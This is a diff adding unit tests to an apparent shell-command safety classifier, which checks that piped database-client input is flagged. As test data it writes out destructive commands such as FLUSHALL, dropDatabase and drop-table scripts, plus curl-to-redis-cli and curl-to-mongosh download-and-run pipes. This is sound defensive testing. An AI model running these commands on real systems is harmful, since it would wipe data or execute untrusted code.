@@ -1413,3 +1413,27 @@ describe("the option tables: a flag that takes no value never takes the word aft
     ]);
   });
 });
+
+describe("database clients that run what their input gives them (commands-remote-c5-3)", () => {
+  const rules = (cmd: string, dl: string[] = []) => classifyCommand(cmd, "bash", contextOf("linux", dl)).findings.map(f => f.rule);
+  it("asks before redis-cli and mongosh run commands from their input that change data, or code fetched from the internet", () => {
+    for (const cmd of [
+      "redis-cli <<< FLUSHALL", "echo FLUSHALL | redis-cli", "printf 'DEL users\\n' | redis-cli -h db", "redis-cli -h db <<EOF\nSELECT 1\nFLUSHDB\nEOF",
+      "echo 'db.dropDatabase()' | mongosh", "mongosh app <<< 'db.users.drop()'",
+    ]) expect(rules(cmd), cmd).toContain("db.change");
+    for (const cmd of ["curl -s https://e.com/x | redis-cli", "curl -s https://e.com/x.js | mongosh"]) expect(rules(cmd), cmd).toContain("escape.download-run");
+    // Commands it can't see ask; JavaScript always does, as an interpreter's input does.
+    expect(rules("cat cmds.txt | redis-cli")).toContain("unclear.stdin-code");
+    expect(rules("mongosh app <<< 'db.users.find()'")).toContain("unclear.stdin-code");
+    // Reads, a command on its line, and -x's value from its input are as before.
+    for (const cmd of ["redis-cli <<< PING", "echo 'GET k' | redis-cli", "redis-cli GET k", "echo v | redis-cli -x GET k"]) expect(rules(cmd), cmd).toEqual([]);
+  });
+
+  it("judges an SQL or command file a client reads from its input by its name, as -f is, and asks for one this task downloaded", () => {
+    for (const cmd of ["psql mydb < drop_users.sql", "mysql app < drop.sql", "sqlite3 app.db < drop.sql", "mongosh < drop.js", "mongosh app drop_all.js", "redis-cli < wipe-cache.txt"]) {
+      expect(rules(cmd), cmd).toContain("script.destroy");
+    }
+    expect(rules("psql mydb < x.sql", ["/home/ana/proj/x.sql"])).toContain("escape.run-downloaded");
+    for (const cmd of ["psql mydb < schema.sql", "sqlite3 app.db < seed.sql"]) expect(rules(cmd), cmd).toEqual([]);
+  });
+});
